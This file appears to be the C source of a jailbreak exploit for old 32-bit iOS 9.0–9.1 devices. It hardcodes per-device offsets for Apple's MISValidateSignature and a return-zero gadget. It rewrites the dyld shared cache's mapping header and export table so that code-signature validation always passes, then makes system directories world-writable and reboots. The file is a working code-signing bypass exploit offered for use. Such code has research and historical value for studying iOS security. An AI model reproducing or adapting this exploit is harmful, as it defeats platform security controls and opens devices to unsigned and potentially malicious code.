/* haxx_overwrite.c - dyld_shared_cache hack for daibutsu jailbreak
 * This is used in pangu 9 (9.0-9.1), and fix in 9.2
 * copyright (c) 2021/04/12 dora2ios
 * license : Anyone but do not abuse.
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <stddef.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>

struct dyld_cache_header
{
    char        magic[16];              // e.g. "dyld_v0    i386"
    uint32_t    mappingOffset;          // file offset to first dyld_cache_mapping_info
    uint32_t    mappingCount;           // number of dyld_cache_mapping_info entries
    uint32_t    imagesOffset;           // file offset to first dyld_cache_image_info
    uint32_t    imagesCount;            // number of dyld_cache_image_info entries
    uint64_t    dyldBaseAddress;        // base address of dyld when cache was built
    uint64_t    codeSignatureOffset;    // file offset of code signature blob
    uint64_t    codeSignatureSize;      // size of code signature blob (zero means to end of file)
    uint64_t    slideInfoOffset;        // file offset of kernel slid info
    uint64_t    slideInfoSize;          // size of kernel slid info
    uint64_t    localSymbolsOffset;     // file offset of where local symbols are stored
    uint64_t    localSymbolsSize;       // size of local symbols information
    uint8_t     uuid[16];               // unique value for each shared cache file
};

struct dyld_cache_mapping_info {
    uint64_t    address;
    uint64_t    size;
    uint64_t    fileOffset;
    uint32_t    maxProt;
    uint32_t    initProt;
};

struct dyld_cache_image_info
{
    uint64_t    address;
    uint64_t    modTime;
    uint64_t    inode;
    uint32_t    pathFileOffset;
    uint32_t    pad;
};


uint64_t exportTableOffset;
uint64_t MISValidateSignature;
uint64_t MOV_R0_0__BX_LR;
int isIOS9a=0;
// no idea

void offset_init(int ver){
    if(ver == 1){
        // iPhone4,1
        exportTableOffset = 0x137F3E85;
        MISValidateSignature = 0x2fe47ca0;
        MOV_R0_0__BX_LR = 0x2fe46516;
        return;
    }
    
    if(ver == 2){
        // iPhone5,2
        exportTableOffset = 0x13A3092D;
        MISValidateSignature = 0x30082cc8;
        MOV_R0_0__BX_LR = 0x3008153e;
        return;
    }
    
    if(ver == 3){
        // iPod5,1
        exportTableOffset = 0x136AC9BD;
        MISValidateSignature = 0x2fd11ca0;
        MOV_R0_0__BX_LR = 0x2fd10516;
        return;
    }
    
    if(ver == 4){
        // iPad2,4
        exportTableOffset = 0x13A3AB59; // str "AndCopyInfo" + 0xA
        MISValidateSignature = 0x30050ca0;
        MOV_R0_0__BX_LR = 0x3004f516;
        return;
    }
    
    if(ver == 5){
        // iPad2,5
        exportTableOffset = 0x13B4E781;
        MISValidateSignature = 0x30134ca0;
        MOV_R0_0__BX_LR = 0x30133516;
        return;
    }
    
    if(ver == 6){
        // iPad2,6
        exportTableOffset = 0x13CA29A5;
        MISValidateSignature = 0x30271ca0;
        MOV_R0_0__BX_LR = 0x30270516;
        return;
    }
    
    if(ver == 7){
        // iPad2,7
        exportTableOffset = 0x13CA29A5;
        MISValidateSignature = 0x30271ca0;
        MOV_R0_0__BX_LR = 0x30270516;
        return;
    }
    
    if(ver == 8){
        // iPad3,1
        exportTableOffset = 0x13AFC73D;
        MISValidateSignature = 0x300f3ca0;
        MOV_R0_0__BX_LR = 0x300f2516;
        return;
    }
    
    if(ver == 9){
        // iPad3,2
        exportTableOffset = 0x13C54961;
        MISValidateSignature = 0x30230ca0;
        MOV_R0_0__BX_LR = 0x3022f516;
        return;
    }
    
    if(ver == 10){
        // iPad3,3
        exportTableOffset = 0x13C54961;
        MISValidateSignature = 0x30230ca0;
        MOV_R0_0__BX_LR = 0x3022f516;
        return;
    }
    
}

int dyld_hack(char *infile, int ver){
    
    void *fileBuf;
    size_t bufSize = 0x100000;
    size_t fileSize;
    
    
    // open file
    FILE *fd = fopen(infile, "r");
    if (!fd) {
        printf("error opening %s\n", infile);
        return -1;
    }
    
    fseek(fd, 0, SEEK_END);
    fileSize = ftell(fd);
    fseek(fd, 0, SEEK_SET);
    
    fileBuf = malloc(bufSize);
    if (!fileBuf) {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }
    
    fread(fileBuf, bufSize, 1, fd);
    fclose(fd);
    // end
    
    offset_init(ver);
    
    struct dyld_cache_header *header = fileBuf;
    
    printf("magic               : %s\n", header->magic);
    printf("mappingOffset       : %08x\n", header->mappingOffset);
    printf("mappingCount        : %u\n", header->mappingCount);
    printf("imagesOffset        : %08x\n", header->imagesOffset);
    printf("imagesCount         : %u\n", header->imagesCount);
    printf("dyldBaseAddress     : %016llx\n", header->dyldBaseAddress);
    printf("codeSignatureOffset : %016llx\n", header->codeSignatureOffset);
    printf("codeSignatureSize   : %016llx\n", header->codeSignatureSize);
    //printf("\n");
    
    
    // cs
    void *csBuf;
    size_t csBufSize = 0x8;
    // open file
    fd = fopen(infile, "r");
    if (!fd) {
        printf("error opening %s\n", infile);
        return -1;
    }
    
    fseek(fd, header->codeSignatureOffset, SEEK_SET);
    
    csBuf = malloc(csBufSize);
    if (!csBuf) {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }
    
    fread(csBuf, csBufSize, 1, fd);
    fclose(fd);
    // end
    
    
    struct dyld_cache_mapping_info *mapInfo = fileBuf + header->mappingOffset;
    for (int i=0; i < header->mappingCount; i++) {
        printf("dyld_cache_mapping_info [%i]\n", i);
        printf("address    : %016llx\n",  mapInfo->address);
        printf("size       : %016llx\n",  mapInfo->size);
        printf("fileOffset : %016llx\n",  mapInfo->fileOffset);
        printf("maxProt    : %08x\n",  mapInfo->maxProt);
        printf("initProt   : %08x\n",  mapInfo->initProt);
        mapInfo++;
        //printf("\n");
    }
    mapInfo = fileBuf + header->mappingOffset;
    
    
    // search str: "/System/Library/Caches/com.apple.xpc/sdk.dylib"
    const char* searchStr8 = "/System/Library/Caches/com.apple.xpc/sdk.dylib";
    const char* searchStr9 = "/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGCorePDF.dylib";
    
    uint64_t pathOffset;
    if(isIOS9a){
        pathOffset = (uint64_t)memmem(fileBuf, bufSize, searchStr9, strlen(searchStr9));
    } else {
        pathOffset = (uint64_t)memmem(fileBuf, bufSize, searchStr8, strlen(searchStr8));
    }
    pathOffset -= (uint64_t)fileBuf;
    
    int pathCount;
    struct dyld_cache_image_info *imageInfo = fileBuf + header->imagesOffset;
    for (int i=0; i < header->imagesCount; i++) {
        //printf("dyld_cache_image_info [%i]\n", i);
        //printf("address        : %016llx\n", imageInfo->address);
        //printf("pathFileOffset : %08x\n", imageInfo->pathFileOffset);
        if(imageInfo->pathFileOffset == pathOffset) pathCount = i;
        //printf("path           : %s\n", (char *)buf+imageInfo->pathFileOffset);
        imageInfo++;
        //printf("pad            : %08x\n", imageInfo->pad);
        ////printf("\n");
    }
    
    if(isIOS9a){
        printf("path name  : %s\n", searchStr9);
    } else {
        printf("path name  : %s\n", searchStr8);
    }
    printf("pathOffset : %016llx\n", pathOffset);
    printf("pathCount  : %d\n", pathCount);
    
    imageInfo = fileBuf + header->imagesOffset;
    //printf("\n");
    
    
    uint64_t pad = 0x2000;
    uint64_t dataSize = 0x4000;
    
    uint64_t baseAddr = mapInfo->address;
    uint64_t imageInfo_baseAddr = imageInfo->address;
    uint64_t headerSize = imageInfo_baseAddr - baseAddr;
    size_t newSize = (fileSize&~0xfff) + pad + headerSize + dataSize;
    
    printf("baseAddr       : %016llx\n", mapInfo->address);
    printf("imageInfo_base : %016llx\n", imageInfo_baseAddr);
    printf("headerSize     : %016llx\n", headerSize);
    printf("size           : %zx -> %zx\n", fileSize, newSize);
    //printf("\n");
    
    
    // dump header
    void *hdBuf = malloc(headerSize);
    bzero(hdBuf, headerSize);
    memcpy(hdBuf, fileBuf, headerSize);
    
    // create newBuf
    void *newHdBuf = malloc(headerSize);
    bzero(newHdBuf, headerSize);
    
    /* copy fakeheader */
    uint64_t newHeaderOffset = ((fileSize&~0xfff)+pad);
    printf("[memcpy] header [sz: %016llx] : %016llx -> %016llx\n", headerSize, (uint64_t)0, newHeaderOffset);
    memcpy(newHdBuf, hdBuf, headerSize);
    
    // dump data
    uint64_t dataOffset = (exportTableOffset&~0xfff);
    uint64_t newDataOffset = ((fileSize&~0xfff)+pad+headerSize);
    
    void *dtBuf = malloc(dataSize);
    bzero(dtBuf, dataSize);
    
    fd = fopen(infile, "r");
    if (!fd) {
        printf("error opening %s\n", infile);
        return -1;
    }
    
    fseek(fd, dataOffset, SEEK_SET);
    
    dtBuf = malloc(dataSize);
    if (!dtBuf) {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }
    
    fread(dtBuf, dataSize, 1, fd);
    fclose(fd);
    // end
    
    // new
    void *newDtBuf = malloc(dataSize);
    bzero(newDtBuf, dataSize);
    /* copy fakedata */
    printf("[memcpy] data   [sz: %016llx] : %016llx -> %016llx\n", dataSize, dataOffset, newDataOffset);
    memcpy(newDtBuf, dtBuf, dataSize);
    //printf("\n");
    
    /* buffer
     * fileBuf:  file header [sz:bufSize]
     * hdBuf:    header      [sz:headerSize]
     * newHdBuf: fake header [sz:headerSize]
     * dtBuf:    data        [sz:dataSize]
     * newDtBuf: fake data   [sz:dataSize]
     * csBuf:    cs data     [sz:csBufSize]
     */
    
    header = hdBuf;
    mapInfo = hdBuf + header->mappingOffset;
    imageInfo = hdBuf + header->imagesOffset;
    
    /* header haxx */
    
    // 1, mappingCount == 6
    uint32_t newCount = 6;
    printf("[RemapHeader1] newCount: %08x -> %08x\n", header->mappingCount, newCount);
    *(uint32_t*)(newHdBuf+offsetof(struct dyld_cache_header, mappingCount)) = newCount;
    //printf("\n");
    
    // 2, imagesOffset = imagesOffset + 3*sizeof(struct dyld_cache_mapping_info)
    uint32_t newImgOffset  = header->imagesOffset + 3*sizeof(struct dyld_cache_mapping_info);
    printf("[RemapHeader2] newImgOffset: %08x -> %08x\n", header->imagesOffset, newImgOffset);
    *(uint32_t*)(newHdBuf+offsetof(struct dyld_cache_header, imagesOffset)) = newImgOffset;
    //printf("\n");
    
    // 3, remap header
    
    // flags
#define F_R (1)
#define F_W (2)
#define F_X (4)
    
    uint64_t nextBase;
    uint64_t nextSize;
    uint64_t nextOffset;
    uint64_t tableBaseSize;
    
    // dyld_cache_mapping_info[i]
    for(int i=0;i<newCount;i++){
        printf("[RemapHeader3] dyld_cache_mapping_info [%i]\n", i);
        
        
        if(i==0){
            nextBase = mapInfo->address + headerSize;
            nextSize = mapInfo->size - headerSize;
            nextOffset = headerSize;
            
            printf("address    : %016llx\n", mapInfo->address);
            
            printf("size       : %016llx -> %016llx\n",  mapInfo->size, headerSize);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = headerSize;
            
            printf("fileOffset : %016llx -> %016llx\n",  mapInfo->fileOffset, newHeaderOffset);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = newHeaderOffset;
            
            printf("maxProt    : %08x -> %08x\n",  mapInfo->maxProt,  (F_R));
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (F_R);
            
            printf("initProt   : %08x -> %08x\n",  mapInfo->initProt, (F_R));
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (F_R);
        }
        
        if(i==1){
            printf("address    : %016llx -> %016llx\n",  mapInfo->address, nextBase);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = nextBase;
            
            printf("size       : %016llx -> %016llx\n",  mapInfo->size, nextSize);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = nextSize;
            
            printf("fileOffset : %016llx -> %016llx\n",  mapInfo->fileOffset, nextOffset);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = nextOffset;
            
            printf("maxProt    : %08x -> %08x\n",  mapInfo->maxProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (mapInfo-1)->maxProt;
            
            printf("initProt   : %08x -> %08x\n",  mapInfo->initProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (mapInfo-1)->maxProt;
            
        }
        
        if(i==2){
            printf("address    : %016llx -> %016llx\n",  mapInfo->address, (mapInfo-1)->address);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = (mapInfo-1)->address;
            
            printf("size       : %016llx -> %016llx\n",  mapInfo->size, (mapInfo-1)->size);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = (mapInfo-1)->size;
            
            printf("fileOffset : %016llx -> %016llx\n",  mapInfo->fileOffset, (mapInfo-1)->fileOffset);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = (mapInfo-1)->fileOffset;
            
            printf("maxProt    : %08x -> %08x\n",  mapInfo->maxProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (mapInfo-1)->maxProt;
            
            printf("initProt   : %08x -> %08x\n",  mapInfo->initProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (mapInfo-1)->maxProt;
        }
        
        if(i==3){
            nextBase = (mapInfo-1)->address + dataOffset-(mapInfo-1)->fileOffset;
            nextSize = dataOffset-(mapInfo-1)->fileOffset;
            printf("address    : %016llx\n", (mapInfo-1)->address);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = (mapInfo-1)->address;
            
            printf("size       : %016llx\n", dataOffset-(mapInfo-1)->fileOffset);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = dataOffset-(mapInfo-1)->fileOffset;
            tableBaseSize = dataOffset-(mapInfo-1)->fileOffset;
            
            printf("fileOffset : %016llx\n", (mapInfo-1)->fileOffset);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = (mapInfo-1)->fileOffset;
            
            printf("maxProt    : %08x\n", (mapInfo-1)->maxProt);
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (mapInfo-1)->maxProt;
            
            printf("initProt   : %08x\n", (mapInfo-1)->maxProt);
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (mapInfo-1)->maxProt;
        }
        
        if(i==4){
            
            printf("address    : %016llx\n", nextBase);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = nextBase;
            
            nextBase = nextBase + dataSize;
            
            printf("size       : %016llx\n", dataSize);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = dataSize;
            
            printf("fileOffset : %016llx\n", newDataOffset);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = newDataOffset;
            
            printf("maxProt    : %08x\n", (F_R));
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (F_R);
            
            printf("initProt   : %08x\n", (F_R));
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (F_R);
        }
        
        if(i==5){
            printf("address    : %016llx\n", nextBase);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = nextBase;
            
            printf("size       : %016llx\n", (mapInfo-3)->size-dataSize-nextSize);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = (mapInfo-3)->size-dataSize-nextSize;
            
            printf("fileOffset : %016llx\n", (mapInfo-3)->fileOffset+dataSize+nextSize);
            *(uint64_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = (mapInfo-3)->fileOffset+dataSize+nextSize;
            
            printf("maxProt    : %08x\n", (F_R));
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (F_R);
            
            printf("initProt   : %08x\n", (F_R));
            *(uint32_t*)(newHdBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (F_R);
            
        }
        
        mapInfo++;
        //printf("\n");
    }
    mapInfo = hdBuf + header->mappingOffset;
    //printf("\n");
    
    // 4, move dyld_cache_image_info
    printf("[RemapHeader4] moving dyld_cache_image_info[%016llx] %08x -> %08x\n", headerSize-newImgOffset, header->imagesOffset, newImgOffset);
    memcpy(newHdBuf+newImgOffset, hdBuf+header->imagesOffset, headerSize-newImgOffset);
    //printf("\n");
    
    // 5, fix dyld_cache_image_info
    uint32_t addSize = newImgOffset-header->imagesOffset;
    printf("dyld_cache_image_info Point: %016lx\n", header->imagesOffset+(pathCount*sizeof(struct dyld_cache_image_info)));
    for (int i=pathCount; i < header->imagesCount; i++) {
        printf("[RemapHeader5] imageInfo->pathFileOffset [%d]: %08x -> %08x\n",
               i,
               (imageInfo+i)->pathFileOffset,
               (imageInfo+i)->pathFileOffset+addSize);
        
        *(uint32_t*)(newHdBuf
                     + (header->imagesOffset)
                     + (i*sizeof(struct dyld_cache_image_info))
                     + (offsetof(struct dyld_cache_image_info, pathFileOffset))
                     + addSize
                     ) = (imageInfo+i)->pathFileOffset+addSize;
    }
    //printf("\n");
    
    // 6, codesignature
    uint32_t cs_length = __builtin_bswap32(*(uint32_t*)(csBuf+4));
    printf("cs_length: %08x\n", cs_length);
    printf("codeSignatureSize: %016llx -> %016llx\n", header->codeSignatureSize, (uint64_t)cs_length);
    *(uint64_t*)(newHdBuf+offsetof(struct dyld_cache_header, codeSignatureSize)) = cs_length;
    //printf("\n");
    
    // 7, change export table
    uint16_t origTable =  *(uint16_t*)(dtBuf+(exportTableOffset-dataOffset));
    //printf("origTable: %04x\n", origTable);
    
    uint64_t patch_point = (exportTableOffset
                            - ((mapInfo+2)->fileOffset + tableBaseSize)
                            + newDataOffset);
    printf("original_point : %016llx\n", exportTableOffset);
    printf("patch_point    : %016llx\n", patch_point);
    
    uint16_t newTable;
    if(MISValidateSignature > MOV_R0_0__BX_LR){
        uint64_t a = MISValidateSignature - MOV_R0_0__BX_LR;
        printf("a: %016llx\n", a);
        
        int i=0;
        while(a>0x80){
            i++;
            a-=0x80;
        }
        printf("i: %x\n", i);
        
        newTable = origTable - a - i*0x100;
    } else {
        uint64_t a = MOV_R0_0__BX_LR - MISValidateSignature;
        printf("a: %016llx\n", a);
        
        int i=0;
        while(a>0x80){
            i++;
            a-=0x80;
        }
        printf("i: %x\n", i);
        
        newTable = origTable + a + i*0x100;
    }
    printf("%016llx: %04x -> %04x\n", patch_point, __builtin_bswap16(origTable), __builtin_bswap16(newTable));
    
    *(uint16_t*)(newDtBuf+(patch_point-newDataOffset)) = newTable;
    //printf("\n");
    /* end */
    
    
    printf("write: %s\n", infile);
    FILE *out = fopen(infile, "r+");
    if (!out) {
        printf("error opening %s\n", infile);
        return -1;
    }
    
    truncate(infile, newSize);
    
    // header
    fseek(out, 0, SEEK_SET);
    fwrite(newHdBuf, headerSize, 1, out);
    
    fseek(out, newHeaderOffset, SEEK_SET);
    fwrite(hdBuf, headerSize, 1, out);
    
    // data
    fseek(out, newDataOffset, SEEK_SET);
    fwrite(newDtBuf, dataSize, 1, out);
    
    //fwrite(newBuf, newSize, 1, out);
    
    /*
     * hdBuf:    orig header [off: newHeaderOffset, sz: headerSize]
     * newHdBuf: fake header [off: 0,               sz: headerSize]
     * newDtBuf: fake data   [off: newDataOffset,   sz: dataSize]
     */
    
    
    fflush(out);
    
    fclose(fd);
    fclose(out);
    
    free(fileBuf);
    free(hdBuf);
    free(newHdBuf);
    free(dtBuf);
    free(newDtBuf);
    free(csBuf);
    
    return 0;
}

int main(int argc, char **argv){
    
    if(argc != 2){
        printf("%s -[DEVICE]\n", argv[0]);
        return 0;
    }
    
    int i;
    int rv=0;
    int isA6=0;
 
    if(!strcmp(argv[1], "-n94")) {
        rv=1;
        isA6=0;
    } else if(!strcmp(argv[1], "-n42")) {
        rv=2;
        isA6=1;
    } else if(!strcmp(argv[1], "-n78")) {
        rv=3;
        isA6=0;
    } else if(!strcmp(argv[1], "-k93a")) {
        rv=4;
        isA6=0;
    } else if(!strcmp(argv[1], "-p105")) {
        rv=5;
        isA6=0;
    } else if(!strcmp(argv[1], "-p106")) {
        rv=6;
        isA6=0;
    } else if(!strcmp(argv[1], "-p107")) {
        rv=7;
        isA6=0;
    } else if(!strcmp(argv[1], "-j1")) {
        rv=8;
        isA6=0;
    } else if(!strcmp(argv[1], "-j2")) {
        rv=9;
        isA6=0;
    } else if(!strcmp(argv[1], "-j2a")) {
        rv=10;
        isA6=0;
    } else {
        printf("[-] ERROR: This device is not supported!\n");
        reboot(0);
    }
    
    chmod("/mnt1/private", 0777);
    chmod("/mnt1/private/var", 0777);
    chmod("/mnt2/mobile", 0777);
    chmod("/mnt2/mobile/Library", 0777);
    chmod("/mnt2/mobile/Library/Preferences", 0777);
    
    sleep(1);
    
    if(isA6 == 1){
        dyld_hack("/mnt1/System/Library/Caches/com.apple.dyld/dyld_shared_cache_armv7s", rv);
    } else {
        dyld_hack("/mnt1/System/Library/Caches/com.apple.dyld/dyld_shared_cache_armv7", rv);
    }
    
    sleep(3);
    // syncing disk
    for(i=0;i<10;i++){
        sync();
    }
    
    sleep(5);
    
    reboot(0);
    return 0;
}
